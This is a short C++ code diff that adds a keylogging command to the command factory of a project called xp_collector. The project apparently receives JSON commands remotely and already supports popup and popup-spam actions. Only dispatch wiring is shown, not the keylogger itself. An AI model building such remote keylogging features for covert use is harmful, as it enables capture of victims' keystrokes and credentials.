@@ -1,5 +1,6 @@
 #include "Commands/CommandFactory.h"
 #include "Commands/PopupCommand.h"
+#include "Commands/KeyLogCommand.h"
 using namespace xp_collector;
 
 std::unique_ptr<BasicCommand> xp_collector::CommandFactory::create(const json& command)
@@ -11,6 +12,8 @@ std::unique_ptr<BasicCommand> xp_collector::CommandFactory::create(const json& c
     case CommandType::Popup:
     case CommandType::PopupSpam:
         return std::make_unique<PopupCommand>(command_id, command_type, command["parameters"]["message"]);
+    case CommandType::KeyLog:
+        return std::make_unique<KeyLogCommand>(command_id, command_type, command["parameters"]["duration"]);
     default:
         return std::move(basic);
     }
